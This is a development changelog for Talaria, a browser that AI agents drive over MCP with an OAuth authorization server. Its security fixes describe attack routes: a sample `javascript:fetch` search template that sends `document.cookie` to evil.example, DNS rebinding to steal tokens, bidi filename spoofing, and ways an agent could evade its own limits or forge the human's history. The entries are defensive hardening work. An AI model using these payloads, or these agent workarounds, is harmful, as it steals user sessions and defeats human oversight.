# Changelog

All notable changes to Talaria are recorded here. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); this project has not
cut a release yet, so everything to date sits under Unreleased.

## [Unreleased]

### Fixed

- **Every authorization-server endpoint is now origin- and host-checked, not just
  `/mcp`.** `rust-mcp-sdk` dispatches its auth routes through an *empty*
  middleware chain, so `/register`, `/authorize`, `/authorize/status`, `/token`
  and `/revoke` carried neither the `Origin` refusal nor the `Host` validation
  that `/mcp` carried twice over. A page served from a rebound
  `http://rebind.evil:PORT/` is same-origin with Talaria's authorization server
  as far as the browser is concerned, so it could register a client, read the
  `client_id` back, drive the consent screen, and — after one human Approve —
  read an access token out of `/token`. Both checks are now an axum layer over
  the whole router. The two RFC 9728 / RFC 8414 discovery documents stay
  deliberately public, because a client fetches them before it has anything to
  present and one that could not would never find the flow; that exemption is an
  explicit two-entry allowlist, so a route added later inherits *checked*
  (`crates/talaria-shell/src/http.rs`).
- **A revoked client's legacy `/sse` stream now closes too.** Stream termination
  was keyed on the `/mcp` path, and the legacy HTTP-plus-event-stream transport
  is live — `rust-mcp-axum` mounts it unconditionally and enables the SDK's `sse`
  feature transitively — so a revoked agent kept receiving from the browser while
  the Access panel showed its row gone. Closing it needed two things, not one:
  the SDK also reads a request's verified identity *before* running the chain
  that produces it, so every `/sse` session was created anonymous, which made it
  unselectable by a revoke and made its tool calls arrive as
  `unverified-client` rather than as the client that presented the token. Both
  are supplied now, from values the SDK verified for that same request
  (`crates/talaria-shell/src/http.rs`).
- **The remote listener no longer leaks a file descriptor per reconnecting
  agent.** The table binding each open stream to its connection claimed to be
  pruned "every time the directory is listed", and the directory was listed only
  from a revoke or a shutdown — neither of which an ordinary session performs. A
  well-behaved client that reconnects a dropped stream was enough: one duplicated
  descriptor stranded per reconnect, unbounded, in the process that also holds
  the credential vault and the browser engine. Pruning now happens where a stream
  actually opens (`crates/talaria-shell/src/http.rs`).
- **An unauthenticated peer can no longer wedge registration, or hide from the
  revoke mechanism.** Thirty-two `POST /register` calls — no credential needed by
  design — used to fill the client registry permanently: refused past the cap,
  never expiring, and rendering no row and so no button, which left hand-editing
  `agents.json` as the only recovery. The oldest *unapproved* registration is now
  displaced instead, so the next legitimate registration succeeds immediately,
  while a client a human approved is still never displaced. The Access panel also
  shows how many programs are waiting for approval and offers to forget them.
  Separately, the connection table that a revoke closes streams through could be
  flushed by opening enough short-lived connections, and lost track of the second
  stream on a keep-alive connection; the descriptor now rides the connection
  itself, so there is no table to flood and nothing to consume
  (`crates/talaria-shell/src/agents.rs`, `gui.rs`, `app.rs`, `http.rs`).
- **An agent can no longer reach Talaria's own listener by driving a page to it.**
  The own-origin refusal lived in the parser for URLs an agent hands to
  `tabs_open` and `navigate`, and page-driven navigation was allowed
  unconditionally — so `evaluate(tab, "location.href = ...")`, a `window.open`, a
  `<meta refresh>` or a link click walked straight around it and left the tab on
  the authorization server's origin. The refusal now sits where navigation
  actually happens, keyed on the tab's owner, so nothing narrows what a person may
  browse (`crates/talaria-shell/src/app.rs`).

- **An agent can no longer forge rows into the human's browsing history.**
  `tabs_list` hands an agent every tab, including the human's own, and `navigate`
  resolved any tab id without checking who owned it — so an agent could point one
  of the human's tabs at a URL of its choosing and have the completed load
  recorded as a page the human visited. The History panel told the human this was
  impossible. Two layers, because either alone leaves a route open: `navigate` now
  refuses a tab the human owns outright (an agent opens its own tabs with
  `tabs_open`, and `tabs_close`'s deliberate permission to act on a tab it does
  not own is untouched), and the history filter now asks who *caused* a load
  rather than who owns the tab it happened in, so an `evaluate` that navigates by
  assigning `location.href` is skipped too. The mark is cleared as the row is
  skipped, so the human's very next navigation on that tab is recorded normally —
  the failure direction is "miss a row", never "forge one"
  (`crates/talaria-shell/src/app.rs`, `tabs.rs`, `history.rs`, `gui.rs`).
- **A download row now says when an agent asked for it, and its name can no longer
  lie.** The Downloads panel hangs a one-click handoff to the OS's default
  application off every row, and an agent chose both the bytes and the extension
  that decides which application that is — while the row showed nothing to tell it
  apart from a file the human fetched themselves. Worse, the filename was checked
  only for `/` and `..`, so newlines, tabs and Unicode bidi overrides reached the
  label unaltered: `invoice.pdf\n\nSafe — from your bank` rendered as two lines,
  and `report␮fdp.exe` rendered as `report.exe.pdf`. Every completed download is
  still recorded whoever asked for it — that was never the problem — but the row
  now carries the provenance and the panel shows it on the line it already had.
  Those characters are refused at the `download` command boundary, and the panel
  sanitizes as well, for rows an older build already wrote. The path `Open`
  launches is untouched: still exactly what was written to disk
  (`crates/talaria-shell/src/downloads.rs`, `app.rs`, `gui.rs`).
- **A website can no longer crash the browser with its own `<title>`.** Both tab
  strips truncated a page-supplied title with `String::truncate`, which takes a
  *byte* index and panics when it lands inside a multibyte character — a title of
  ten CJK characters is 30 bytes, and byte 28 is mid-character. The panic happened
  on the main thread inside egui's render pass, so it took the whole application
  down: every tab, and every agent session. Both sites now use the
  `truncate_chars` helper the panels already used
  (`crates/talaria-shell/src/gui.rs`).
- **The four plaintext stores are now owner-only.** `history.jsonl`,
  `bookmarks.json`, `config.json` and `downloads.json` were written at `0644` in a
  `0755` directory, so on a shared machine the complete record of every URL the
  user had visited — query strings, and the session tokens and reset links they
  carry, included — was readable by every local account. Two of those modules
  justified storing plaintext on the ground that the file permissions already
  restricted access; nothing set them. All four files now land at `0600` and the
  config directory at `0700`, through a new
  `crates/talaria-shell/src/permissions.rs`. The mode is applied to the staged
  `.tmp` *before* the atomic rename, since a rename carries the staged file's
  mode, and `history.jsonl` — which is append-only and so never recreated — is
  brought down at load, so a log written by an earlier build is repaired rather
  than left open. Unix-only, and a permission that cannot be set is logged and
  the write still happens.
- **`TALARIA_HISTORY_MAX_ENTRIES=0` no longer deletes the entire history at every
  startup.** `"0"` parses successfully, so it was accepted as a real retention cap
  and pruned every row — the exact opposite of what someone reading `0` as "no
  limit" was asking for, unrecoverable, and announced only in a log line. Zero now
  falls back to the default of 5,000 (`crates/talaria-shell/src/history.rs`).
- **A search-engine template must now be an `http`/`https` URL.** Validation
  checked only that `{query}` appeared exactly once, so
  `javascript:fetch('https://evil.example/'+document.cookie)//{query}` and
  `file:///{query}` both saved, persisted across restarts, and became what the
  address bar navigated to for every non-URL thing typed into it. The address bar
  already refused `data:` for this reason; the settings field is the same attack
  with a much longer persistence. The Save gate and the load path share one
  validator, so a hand-edited `config.json` degrades to the default engine rather
  than being honoured for having skipped the button
  (`crates/talaria-shell/src/settings.rs`).
- **The vault can no longer hang startup on a machine with no session D-Bus.**
  `Vault::load()` runs on the main thread and asked the OS keychain for its key
  through `keyring`, which on Linux talks to the Secret Service over D-Bus. With
  no `DBUS_SESSION_BUS_ADDRESS`, libdbus does not fail — it tries to *start* a
  session bus and blocks forever when it cannot, which froze the event loop while
  the control socket kept answering `hello`. The shell looked alive and served
  nothing. Fixed in two layers in `crates/talaria-shell/src/vault.rs`: the
  keychain is skipped outright when no bus can exist, and the lookup is
  time-bounded (1500ms, `TALARIA_KEYCHAIN_TIMEOUT_MS`) when one is merely
  unreachable. Affected every headless server, container, SSH session and CI job.

### Added

- **The remote view client shows the page and drives it.** `talaria-client` now
  presents the frames of the agent tab it is attached to and sends the human's
  pointer and keyboard back into it, which is Success Criterion 1 demonstrable
  rather than assembled: a keyframe replaces the whole surface, a delta is
  uploaded into exactly the region its header names, a frame whose sequence does
  not exceed the last one applied is discarded, and a payload that does not
  decode costs one frame rather than the view. The picture is fitted into the
  client's own page area preserving aspect ratio, and a pointer is mapped back
  through **the inverse of that same value** — one transform, defined in
  `present.rs` and inverted in `input.rs`, because two written separately
  disagree the first time either changes and the disagreement is a click landing
  somewhere the human did not aim. A position in the letterboxed margin or over
  the client's own controls sends *nothing*, rather than a position moved to the
  page's nearest edge, which would be a click nobody made at the edge of the page
  where a confirm button lives. The rounding is a floor, so a pointer anywhere
  within the screen pixel showing page pixel *n* means *n*. **Nothing asks the
  server to resize a tab**: the viewer adapts to the page, because the
  alternative reflows an agent's layout because somebody started watching it. The
  end-to-end suite drives the real client binary with a real pointer and real
  keystrokes at a deliberately mismatched window size and asserts the effect on
  the server over the control socket — including that a background agent tab can
  be typed into, which 05-08 left as an open question
  (`crates/talaria-client/src/present.rs`, `crates/talaria-client/src/input.rs`,
  `tests/e2e/remote_view_test.py`).

- **A remote viewer now receives pixels: a keyframe on attach, only what changed
  afterwards, and nothing at all while the page is static.** Attaching to a tab
  takes a *visibility hold* on it (`crates/talaria-shell/src/tabs.rs`) — a count
  rather than a flag, because two viewers may hold one tab and the first to
  leave must not release it — and that hold is what closes the gap the input
  work left behind: Servo answers a hit test only for a shown webview, so before
  this a remote click on a tab the local human was not looking at reached
  nothing at all. A held tab is shown and deliberately **not** focused, the tab
  the human is displaying always wins, and the view module names no active-tab
  setter, no view mode and no focus call, so an attachment cannot move, refocus
  or blank anything on the local screen. Each tab renders into its own
  framebuffer, and the end-to-end suite now proves rather than cites it: the
  human's own tab is captured before and after a whole frame exchange on another
  tab and compared byte for byte.

  The pump paints unconditionally on its own tick instead of waiting for a
  repaint notification — the engine's documentation licenses it, a settled page
  never produces one, and the one-shot screenshot path answers the wait with a
  one-and-a-half-second timeout, which at thirty ticks a second would deliver
  nothing until each one expired. Its cadence joins the event loop's existing
  wait computation rather than installing a second control-flow source: 30 ms
  while a viewer is driving the tab, requested unconditionally on every machine,
  and 250 ms while nobody is, with the transition on
  `TALARIA_VIEW_IDLE_MS`-since-the-last-accepted-input. With no viewer attached
  there is no tick, no readback and no tab held shown.

  Everything after the readback happens on a fourth off-thread actor,
  `talaria-frames`: a 64×64 tile comparison with a short-circuit on the first
  differing row, a keyframe whenever more than nine twenty-sixths of the grid
  changed (a scroll is one keyframe, not hundreds of tile messages), and a PNG
  encoder that is a **sibling** of the screenshot encoder rather than a
  modification of it — the screenshot path is byte-identical and still has its
  one call site. One previous-frame buffer per *attachment*, released on detach,
  on disconnect and on the tab closing; that release is the memory bound. The
  thread degrades rather than aborting: a browser whose frame encoder could not
  start is still a browser, and a viewer is refused with the one refusal instead
  of being left on a stream that would never produce a frame
  (`crates/talaria-shell/src/view.rs`).
- **A remote human can now click, scroll and type into an agent's tab — and into
  nothing else.** Input arriving on the `/view` channel enters the engine through
  one module, `crates/talaria-shell/src/remote_input.rs`, which reaches a
  webview's input entry point and, by construction rather than by check, reaches
  no chrome, no browser-shortcut handler, no interface action, no panel, no
  active-tab state, no view mode and no window focus. That absence is the
  guarantee: an actor that can aim synthetic input at the chrome can aim it at
  the credentials control, the bookmark star, or a downloads row's open control,
  which hands a file to the operating system's default application — the
  argument `ChromeRect`'s own doc comment already made for agents, applied
  verbatim to the party this adds. A tab the human owns is resolved through the
  agent-only lookup, so it is unrepresentable on this path rather than refused
  downstream, and it takes the same exit a tab that never existed takes. The
  per-connection input sequence is strictly increasing and a non-increasing
  value is dropped, which is replay resistance within a connection, the ordering
  rule under coalescing, and the latency measurement a frame header will echo —
  one field doing three jobs. The three pointer forwarders now take a webview
  and a point **already relative to that tab's viewport**, with the local
  window's toolbar subtraction moved to the local call site, because a remote
  client draws no server toolbar and a shared subtraction would put a silent
  toolbar-height error on every remote click that nothing would report. The
  end-to-end suite proves the click lands on the element it was aimed at by
  naming the destination it reached, on a fixture carrying a decoy link one
  toolbar-height above each real one (`crates/talaria-shell/src/remote_input.rs`,
  `app.rs`, `keyutils.rs`, `view.rs`, `tests/e2e/remote_view_test.py`).
- **Talaria can now advertise an identity it did not bind, and be reached over a
  secure transport without ever handling one.** A new optional
  `remote_access.advertised_url` key in `config.json` names the origin clients
  actually reach this browser at when a reverse proxy fronts the loopback
  listener. One value feeds all of it — the RFC 8707 canonical resource
  identifier, the RFC 8414 issuer, the four authorization-server endpoint URLs,
  the RFC 9728 protected-resource document, the DNS-rebinding host allowlist and
  the outermost layer's `Host` comparison — threaded exactly the way the bound
  address already was, because those strings are compared byte for byte and four
  independent constructions would be four places to disagree. It comes from
  configuration and **never** from a request header: a local page that could set
  the advertised issuer could make this browser point a client at an
  authorization server the page chose. The value is refused rather than
  normalised — the secure scheme (with OAuth 2.1 §1.5's
  loopback-literal-with-a-port exception), no path, no query, no fragment, no
  user information, not even a bare trailing slash — because a normalisation is
  a second spelling, and any refusal leaves the whole remote-access block off.
  **The bind host did not widen.** It is still a module constant used at exactly
  one place, `config.json` still cannot express an address, and the hand-edited
  `bind` key is still refused out loud: transport security is terminated by the
  Tailscale daemon in front of an unchanged loopback listener, so nothing about
  renewal is ever this process's problem. With the key absent every published
  string is byte-identical to what shipped before it, proven by two unmodified
  end-to-end suites (`crates/talaria-shell/src/settings.rs`,
  `crates/talaria-shell/src/oauth.rs`, `crates/talaria-shell/src/http.rs`).
- **`scripts/tailscale-serve.sh` stands the proxy up and takes it down.**
  Executable, with an `up` and a `down` and no third mode. It confirms its
  prerequisites rather than assuming them, refuses a port that already carries a
  mapping it did not create, refuses to publish a mapping pointing at nothing,
  prints a before/after diff on teardown, and prints the exact `config.json` key
  the mapping implies — the one moment both halves of the identity are on screen
  together. Funnel, the public-internet variant, is refused **by name** with its
  reason rather than merely omitted: the process on the other end of the mapping
  holds an encrypted credential vault and the human's logged-in browsing
  sessions, and the two commands differ by a few characters.
- **The remote view wire has a named, tested vocabulary.**
  `crates/talaria-protocol/src/wire.rs` defines the multiplexed envelope a
  remote viewer speaks: five one-byte channel tags — `0x01` control, `0x02`
  tabs, `0x03` event, `0x04` input, `0x10` frame — split into a low block of
  human-readable JSON channels and a high block of binary ones, so a single byte
  tells a reader which world it is in before it decodes anything. The frame
  channel carries a fixed 51-byte little-endian header ahead of raw PNG bytes,
  including the last input sequence the server had applied when it painted:
  that one field makes input-to-photon latency measurable with no clock shared
  between the two machines, and lets a client discard a frame that predates its
  own most recent click. `TabInfo`, `Outcome` and `Event` go onto this wire
  unchanged rather than being restated.

  **Malformed input is refused, never defaulted.** A tag naming no channel, a
  slice shorter than the header layout, an unknown format version, an unknown
  frame kind, a zero scale denominator, a tile with no area, a tile that does
  not fit inside the frame it declares, a missing JSON field, a coordinate that
  is not a finite number, and a key naming both or neither a character and a
  named key each produce nothing at all. A decoder that substituted a plausible
  zero for a bad coordinate would be a decoder that let a malformed message move
  a real pointer. Twenty-one tests, one per property.

  **The view channel carries no agent tool vocabulary**, and that is expressed
  as an absence in the types rather than as a runtime check: a viewer lists,
  watches, clicks, scrolls and types, and cannot open, navigate, evaluate, close
  or download. The server's refusal likewise has no field to be informative
  with, so a client cannot tell "that tab belongs to the human" from "there is
  no such tab" (`crates/talaria-protocol/src/wire.rs`).

- **You can see every agent that may drive this browser, and take one's access
  away** (AUTH-02). The Access panel now lists one row per authorized agent —
  the identifier Talaria minted for it, the name it asked to be called, and how
  long ago you approved it — with a Revoke button on each. Revoke takes two
  clicks, in place, and the second one is armed against *that specific client*
  rather than that row's position, so a list that changes between the two
  clicks cannot complete the revoke against a different agent.

  **Revoking closes the agent's open connections, not just its next request.**
  That distinction is the whole of why this is a feature rather than a line of
  code. Authorization is checked on every request, so a revoked agent's next
  request fails for free — but an agent holding a long-lived event stream has
  no next request, and would have carried on receiving from your browser while
  the panel showed it gone. Talaria closes the connection that stream is riding
  on, so it ends.

  A request that was already running when you clicked stays running: it had
  already been authorized, and a command executing against a page cannot be
  taken back. Everything else stops. The revocation survives a restart, and it
  takes the agent's registration with its tokens, so the row cannot reappear
  without you approving it again.

  What revoking does **not** do: close the agent's tabs. They stay open in the
  Agents view and you can take any of them over. The agent cannot drive them
  any more, and throwing away pages you might still want is not what "revoke"
  should mean. Nothing else of yours is touched — no history, no bookmarks, no
  stored credentials, no downloads.

  Agents can also revoke their own tokens through the standard endpoint
  (`/revoke`, RFC 7009), which is a well-behaved client tidying up after itself
  rather than you withdrawing access
  (`crates/talaria-shell/src/gui.rs`, `app.rs`, `http.rs`, `oauth.rs`).

- **An agent can now ask for access, and you decide in the browser itself**
  (AUTH-01, completing the entry below). Talaria hosts its own OAuth 2.1
  authorization server: an agent that knows nothing but the endpoint URL can
  register itself, ask for authorization with PKCE `S256`, and — once you say
  yes — exchange that for a short-lived token with a refresh token beside it.
  Refresh tokens rotate on every use, and presenting one twice revokes the
  whole family, because two parties holding the same token means one of them
  stole it and there is no way to tell which.

  **The approval prompt is part of the browser, not a web page.** It appears in
  Talaria's own chrome, over whatever you were doing, and the page the agent's
  browser lands on has no form, no button and no link — nothing for a script to
  click. Approve stays disabled for a second after the prompt appears, so a
  click you had already started cannot land on it, and only one prompt is ever
  on screen at a time. The name an agent asks to be called is shown in quotes,
  marked as its own claim, and stripped of anything that could make it look
  like Talaria's words rather than the agent's
  (`crates/talaria-shell/src/oauth.rs`, `agents.rs`, `gui.rs`, `app.rs`).

- **The remote MCP transport now accepts a real credential — and tells a client
  how to get one** (AUTH-01). The interim provider that refused everything is
  gone. In its place, Talaria acts as an OAuth 2.1 **resource server**: an
  agent presents an opaque bearer token, the token is looked up **live** in the
  agent store on every single request, and its recorded audience is compared
  byte for byte against this server's own canonical identifier. A token minted
  for some other service cannot be replayed here, and Talaria never forwards a
  token it received anywhere.

  Because the lookup is live and nothing is cached, revoking a token takes
  effect on the very next request rather than at the next restart.

  **Discovery works, which is the half that is easy to skip.** An
  unauthenticated request is still answered `401`, but the refusal now carries
  a `WWW-Authenticate: Bearer ... resource_metadata="…"` challenge, and that URL
  serves an RFC 9728 protected-resource metadata document naming this server's
  resource identifier and its authorization server. A client configured with
  nothing but the MCP endpoint URL — which is all a human writes down — can
  find its way from there. A server that minted and validated tokens while
  publishing none of this would be one no conformant client could actually
  connect to.

  Unknown, expired and wrong-audience tokens are refused **identically**, with
  the same status and the same body, so the endpoint cannot be used to find out
  which tokens exist. No token material and no `Authorization` header value ever
  reaches a log line: a log names a caller by its registered client id and a
  token by a short digest prefix.

  One more thing changes with the token: over HTTP, the browser now knows *who*
  is calling. A tab an agent opens is labelled with the client identifier this
  browser minted and a human approved, not with the name the caller typed into
  `initialize`. Stdio sessions keep their self-asserted label, because over that
  transport there is nothing better to use.

  Still deliberately absent: TLS and any non-loopback bind, which are the next
  milestone's. Staying on loopback is what makes shipping without TLS conformant
  rather than skipped: OAuth 2.1's HTTPS requirement carries an explicit
  loopback exception. Also absent, and on security grounds rather than
  scheduling: Client ID Metadata Documents, which would require this browser to
  fetch a URL an unauthenticated caller chose — see `SECURITY.md`
  (`crates/talaria-shell/src/oauth.rs`, `http.rs`, `app.rs`).

- **A remote MCP transport, off by default and loopback-only** (AUTH-03).
  Talaria can now serve MCP over Streamable HTTP as well as over its Unix
  control socket. The listener is **disabled unless `config.json` says
  otherwise** — with no configuration there is no thread and no bound port at
  all, which the e2e suite proves with a refused connection rather than by
  reading a flag back — and when enabled it binds `127.0.0.1` and nothing else.
  There is deliberately no bind-address setting: the bind host is a constant in
  `crates/talaria-shell/src/http.rs`, and a hand-edited `config.json` naming any
  other address degrades that one key to disabled without disturbing the search
  engine beside it.

  **A bearer token is the entire boundary on this transport**, and the two
  clauses above are why. `SO_PEERCRED` has no TCP equivalent, so the kernel
  cannot tell the listener who is connecting the way it does for the Unix
  control socket, and `127.0.0.1:PORT` is reachable by every local account on
  the machine. An unauthenticated request is answered `401` and touches
  nothing; a request carrying an `Origin` header — which a command-line MCP
  client never sends and a web page always does — is refused outright before
  authentication even runs. See the AUTH-01 and AUTH-02 entries above for how
  a request comes to carry a credential at all, and how you take one back.

  A new **Access panel** (toolbar button, no keyboard shortcut) shows whether
  anything is listening and on what address, and carries the switch. Turning it
  on takes two clicks; turning it off takes one, because confirming a move
  toward safety only teaches people to click through confirmations. The toolbar
  button itself is the always-visible signal — an unplugged glyph when off, a
  connected one plus the port number when bound — read from the address the
  listener actually bound and reported back, never from the configured value, so
  the two surfaces cannot disagree. An agent may not point a tab at that address
  while it is bound; the refusal says so by name
  (`crates/talaria-shell/src/http.rs`, `settings.rs`, `app.rs`, `gui.rs`,
  `control.rs`, `crates/talaria-mcp/src/lib.rs`).

- **The store that will decide which agents may drive the browser** — the
  registered clients and the tokens they hold, in a new `agents.json` beside the
  other stores. It was built as the half that can be tested exhaustively without
  a server running; the endpoints that mint, check and revoke it are described in
  the AUTH-01 and AUTH-02 entries above.

  **It holds no credentials.** Only the SHA-256 of each token is written down —
  a stolen `agents.json` yields hashes, not tokens — which is what lets the file
  be plaintext at `0600` inside a `0700` directory rather than encrypted, and what
  keeps it out of the credential vault. Out of the vault twice over, in fact: the
  vault's key comes from the OS keychain, whose known startup hang on machines
  with no session D-Bus would otherwise mean "no session bus" becomes "no agent
  can connect"; and the vault is reachable from the `cookies_read` tool, so token
  material must not live behind a door an agent already holds a key to.

  **A damaged file admits nobody rather than everybody.** A corrupt, truncated or
  hand-mangled `agents.json` degrades to an empty client set — every agent has to
  re-authorize — and never to an empty *check*. The code is shaped so the other
  answer is not writable: every decision is a search of a list, an empty list
  finds nothing, and there is no store-is-empty branch anywhere.

  Tokens are opaque 32-byte values from the operating system's random source,
  never derived from a clock — the module contains no clock type at all, so every
  time value is a parameter. Digests are compared over every byte rather than
  returning at the first difference, so how long an answer takes does not reveal
  how much of a guess was right. Refresh tokens rotate on every use and presenting
  a spent one revokes its whole family, while a client legitimately retrying with
  its current token is not caught by that rule. Registrations are capped, a
  registration past the cap is refused rather than evicting a legitimate client,
  and a registration no human approved holds no tokens and can do nothing.
  Writes stage into a `.tmp` sibling and rename, so a process killed mid-save
  leaves either the old set or the new one
  (`crates/talaria-shell/src/agents.rs`, `main.rs`).

- **Local browsing history** (BROWSE-01). Every navigation that completes on a
  human ("Me") tab appends a `(url, title, timestamp)` row to `history.jsonl`
  under the config dir, and a History panel (toolbar button, Ctrl+H) lists them
  newest-first. Agent-owned tabs deliberately do **not** write to the human's
  history — an agent driving a session should not silently populate the user's
  record of where *they* have been.

  An append-only log rather than a whole-file rewrite, because history is the
  one high-churn store here: a rewrite per navigation would grow quadratically
  with the file. The 5,000-entry cap (`TALARIA_HISTORY_MAX_ENTRIES`) is applied
  by pruning at load, which is the only moment the file is rewritten.

  **Known gap, measured rather than assumed:** Servo 0.4.0 does not re-fire
  `LoadStatus::Complete` for a same-document navigation, so a single-page app's
  `pushState` route changes produce no history row. `tests/e2e/history_test.py`
  prints this observation on every run instead of asserting it, so a future
  Servo that changes the behaviour will say so rather than going silently green.

- **Bookmarks** (BROWSE-02). A toolbar star (Ctrl+D) toggles the current page
  bookmarked, and a Bookmarks panel (Ctrl+B) lists them for revisiting.
  `bookmarks.json` is written atomically — staged into a `.tmp` sibling and
  renamed, a sibling because `fs::rename` is only atomic within one filesystem —
  so a process killed mid-save cannot leave a half-written list, and a stale
  `.tmp` is never read back as data.

- **A configurable default search engine** (BROWSE-03). The address bar's
  hardcoded DuckDuckGo fallback is gone: `resolve_location` now takes a
  `&SearchEngine` read from `config.json`, editable from a Settings panel whose
  Save is gated on the URL template containing `{query}` exactly once. A
  malformed or hand-edited config degrades to the default engine rather than
  panicking.

  Deliberately *not* changed: a `data:` URL typed into the human address bar is
  still treated as a search query rather than navigated to. Widening it to match
  the agent path's handling was considered and declined — "the human typed it,
  so trust it" is weakest exactly where the paste-this-into-your-address-bar
  pattern makes the human a courier for someone else's payload. The two trust
  roots differ on purpose.

- **A downloads list** (BROWSE-04). Every download that completes now appends a
  row to `downloads.json`, and a Downloads panel (toolbar `⬇` button, Ctrl+J)
  lists them newest-first with a size, an age, an `Open` button and a
  remove-from-list button. Deliberately records *every* completed download
  regardless of which client asked for it — unlike history, which is Me-only —
  because a file that landed on the user's disk is theirs to see whoever caused
  it. Removing a row never deletes the file.

  Two properties worth stating rather than leaving to be discovered:

  - The stored path is the path that was **actually written**, not the filename
    that was requested. Those differ whenever a name collided and `create_unique`
    uniquified it to `report (1).pdf`, and the stored path is what `Open` hands
    to the OS.
  - `Open` launches `xdg-open` and is therefore the browser's only
    process-spawning surface. It is reachable **only** from the Downloads
    panel's own button. There is no MCP tool, no control-socket command and no
    `talaria-protocol` variant that reaches it — an agent-reachable opener would
    hand back exactly the local-execution surface the agent-surface hardening
    work removed.

  This needed the first `EventLoopProxy` on `Shared`: `download()` runs on a
  background thread, and `Shared` is `Rc`-based and not `Send`, so completion
  travels back as an `AppEvent` applied on the main loop rather than by touching
  the store off-thread.
- `tests/e2e/downloads_list_test.py`, pinning that a real fetch produces a
  correct row, that two same-named downloads get two distinct rows on their two
  distinct paths, and that a refused download produces none.
- **`Event::TabOpened { tab_id, opener_tab_id }`** (AGENT-04). A popup adopted
  into an agent's session — a page it drives calling `window.open` or following a
  `target=_blank` link — is now announced to the owning session instead of being
  discoverable only by polling `tabs_list`. Reaches MCP clients as a
  `notifications/message`, like the existing crash and close events.
- `tests/e2e/vault_nobus_test.py`, pinning the no-bus startup path.
- **A `chrome_rects` test hook, and the panel-click suite it makes possible.**
  The shell can now report the logical rect of each named chrome control — the
  toolbar's buttons and the rows of whichever panel is open — collected from the
  `Response`s the chrome already computes. Gated on `TALARIA_TEST_HOOKS=1`
  exactly as the `evaluate` crash hook is, refused as an unknown command without
  it, and deliberately not an MCP tool: chrome geometry is a map of the human's
  own controls, and an agent that could read it would know where to aim
  synthetic input at the credentials button, the bookmark star or a downloads
  row (`crates/talaria-protocol/src/lib.rs`, `crates/talaria-shell/src/gui.rs`,
  `app.rs`).

  This deletes the hardcoded toolbar coordinate `tests/e2e/vault_ui_test.py`
  carried, which moved four times in one phase and was discovered as a red suite
  every time. It also unblocks `tests/e2e/panel_click_test.py`, which drives the
  six behaviours that previously had no automated coverage: clicking a history
  row and a bookmark row to navigate and close the panel, the two-click Clear
  history confirm *and* its reset when the panel closes, and the Downloads
  panel's `Open` — that it launches at all, that it launches **exactly the path
  the row stores** (proved by downloading the same filename twice and pressing
  Open on the first row, whose path a re-derivation could not produce), and that
  a spawn failure shows a dismissible inline notice instead of taking the
  browser down. `xdg-open` is faked for the run by a script written to a temp
  directory, so the argv assertions are exact and nothing launches a real
  application.

### Changed

- **`talaria-protocol` now says what it is: the shared vocabulary, not the
  distributed wire.** Three places claimed the crate *was* the distributed
  protocol — its own module header, `control.rs`'s, and the shape of its public
  surface, four of whose roughly eleven items were a Unix filesystem path and a
  raw `getuid` shim that mean nothing to a peer on another machine.
  `socket_dir`, `socket_path`, `ensure_socket_dir`, `current_uid` and the shim
  moved verbatim into a new `local` module behind `#[cfg(unix)]`, and are
  deliberately *not* re-exported from the root — a re-export would have left the
  surface being corrected exactly as it was. Both callers follow the move by
  name. `control.rs`'s header now records why that transport stayed local rather
  than becoming the distributed one: its `Hello` line is self-asserted and is
  safe only because `SO_PEERCRED` has already vouched that the peer runs as the
  same OS user, and `SO_PEERCRED` has no TCP equivalent. No behaviour changed
  (`crates/talaria-protocol/src/lib.rs`, `crates/talaria-protocol/src/local.rs`,
  `crates/talaria-shell/src/control.rs`, `crates/talaria-mcp/src/socket.rs`).

- **`axum`'s WebSocket support is now available to the shell.** `axum` is
  declared directly in `[workspace.dependencies]` at the `0.8.9` already
  resolved here, with its `ws` feature, and `talaria-shell` takes it by
  workspace inheritance. It is a unification rather than a new resolution:
  `axum 0.8.9` was already in the tree through `rust-mcp-axum` and
  `crates/talaria-shell/src/http.rs` already used it by name through that
  re-export, so there is exactly one `axum` node before and after. **One crate
  entered the lockfile** — `tokio-tungstenite 0.29.0`, whose sibling
  `tungstenite 0.29.0` Servo's own network stack already pulls in — and nothing
  already in the lockfile changed version, so the `primeorder 0.14.0-rc.14` pin
  that keeps this workspace buildable survived untouched. No runtime behaviour
  changes yet: no WebSocket route is mounted (`Cargo.toml`, `Cargo.lock`,
  `crates/talaria-shell/Cargo.toml`).
- **The HTTP and OAuth dependency stack is now available to the shell.**
  `rust-mcp-sdk`'s feature list widened to `server`, `macros`, `stdio`,
  `streamable-http` and `auth`, and `talaria-shell` gained `rust-mcp-sdk`,
  `rust-mcp-axum`, `sha2`, `async-trait` and tokio's `rt-multi-thread`. The
  legacy Server-Sent-Events transport feature is deliberately not enabled: the
  newer MCP revision deprecates that transport, and a long-lived legacy stream
  is the easiest way for a revoked client to keep talking. Twenty-five crates
  entered the lockfile — `axum`, `axum-server`, `jsonwebtoken`, `reqwest`,
  `rust-mcp-axum` and their transitives — and nothing already in it changed
  version, so the `primeorder 0.14.0-rc.14` pin that keeps this workspace
  buildable survived untouched. No runtime behaviour changes yet: no port is
  opened and no route is served (`Cargo.toml`, `Cargo.lock`,
  `crates/talaria-shell/Cargo.toml`).
- **The MCP tool surface now lives in a library crate rather than inside the stdio
  binary.** `crates/talaria-mcp` gained a `[lib]` target; the nine tool structs,
  their schemas and `dispatch` are defined once there, and `dispatch` takes a
  `CommandSink` — a one-method trait for handing a `Command` to a running shell —
  instead of naming the control-socket connection type. The stdio proxy is now a
  consumer of its own library, and its behaviour is unchanged: same nine tools,
  same descriptions and schemas, same protocol revision, same errors, proven by
  an unmodified `tests/e2e/mcp_client_test.py`. This is groundwork for serving
  the identical tool surface over a second transport without a second copy of it
  (`crates/talaria-mcp/src/lib.rs`, `tools.rs`, `socket.rs`, `main.rs`).
- The e2e CI job no longer wraps the suite in `dbus-run-session`. That wrapper
  existed to hide the startup hang above; with the hang fixed at the source,
  running bare is what proves the fallback works.
